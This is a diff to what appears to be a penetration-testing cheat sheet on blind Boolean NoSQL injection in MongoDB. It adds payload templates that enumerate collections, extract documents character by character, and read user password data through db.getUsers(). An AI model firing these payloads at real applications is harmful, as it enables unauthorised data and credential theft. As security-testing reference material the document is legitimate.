@@ -217,17 +217,16 @@ Note that, as specified above, blind NoSQL injections are not possible on
 MongoDB 2.4 and subsequent versions. Prior to this version, the global `db`
 variable could be referenced to and used in injection.
 
+The injections used below are blind Boolean injections. The web server
+comportment should vary depending on whether the query evaluated to `true` or
+`false`.
+
 Different injections' syntax may work:
 
 ```
-
+'||<INJECT>||'
 '||(tojsononeline(<INJECT>)|'
-"\"'||this||'", "'||<INJECT>||'"
- ["\"';return+true;var+foo='", "';return+[inject];var+foo='"],
- ['\'"||this||"','"||[inject]||"'],
- ['\'";return+true;var+foo="', '";return+[inject];var+foo="'],
- ["||this","||[inject]"]]
-
+';return+<INJECT>;var+foo='
 ```
 
 *Collections length and names*
@@ -240,22 +239,39 @@ names manually:
 
 ```
 # Number of collections
-db.getCollectionNames().length==<N>
+# db.getCollectionNames().length==<N>
+'||db.getCollectionNames().length==<N>||'
+';return+db.getCollectionNames().length==<N>;var+foo='
+'||(tojsononeline(db.getCollectionNames().length)=='<N>')|'
 
 # Collections name's length
-db.getCollectionNames()[<COLLECTION_INDEX>].length==<N>
+# db.getCollectionNames()[<COLLECTION_INDEX>].length==<N>
+'||db.getCollectionNames()[<COLLECTION_INDEX>].length==<N>||'
+';return+db.getCollectionNames()[<COLLECTION_INDEX>].length==<N>;var+foo='
+'||(tojsononeline(db.getCollectionNames()[<COLLECTION_INDEX>].length)=='<N>')|'
 
 # Collections names'
-db.getCollectionNames()[<COLLECTION_INDEX>][<NAME_LETTER_INDEX>]=='<LETTER>'
+# db.getCollectionNames()[<COLLECTION_INDEX>][<COLLECTION_NAME_LETTER_INDEX>]=='<LETTER>'
+'||db.getCollectionNames()[<COLLECTION_INDEX>][<COLLECTION_NAME_LETTER_INDEX>]=='<LETTER>'||'
+';return+db.getCollectionNames()[<COLLECTION_INDEX>][<COLLECTION_NAME_LETTER_INDEX>]=='<LETTER>';var+foo='
+'||(tojsononeline(db.getCollectionNames()[<COLLECTION_INDEX>][<COLLECTION_NAME_LETTER_INDEX>])=='<LETTER>')|'
 ```
 
 *Collections enumeration*
 
-To enumerate a collection documents:
+To enumerate a collection's documents:
 
 ```
-db.<COLLECTION_NAME>.find()[0])[0]=='u'
-tojson(db.<COLLECTION_NAME>.find().toArray()).replace(/[%5Ct%5Cr%5Cn]/gm, \'\')[].charCodeAt()==' + num;
+# db.<COLLECTION_NAME>.find()[<DOCUMENT_INDEX>][<DOCUMENT_NAME_LETTER_INDEX>]=='<LETTER>'
+'||db.<COLLECTION_NAME>.find()[<DOCUMENT_INDEX>][<DOCUMENT_NAME_LETTER_INDEX>]=='<LETTER>'||'
+';return+db.<COLLECTION_NAME>.find()[<DOCUMENT_INDEX>][<DOCUMENT_NAME_LETTER_INDEX>]=='<LETTER>';var+foo='
+'||(tojsononeline(db.<COLLECTION_NAME>.find()[<DOCUMENT_INDEX>])[<DOCUMENT_NAME_LETTER_INDEX>]=='<LETTER>')|'
+
+# Retrieve users' passwords
+# use getUsers() to retrieve the usernames/passwords or getUser() to retrieve a specific user password
+'||(tojsononeline(db.getUsers()[0])[0]=='{')|'
+'||(tojsononeline(db.getUsers()[<USER_INDEX>])[<USER_JSON_INDEX>]==<LETTER>)|'
+'||(tojsononeline(db.getUser("<USERNAME>"))[<USER_JSON_INDEX>]=='{'
 ```
 
 ###### `$where` Denial of Service
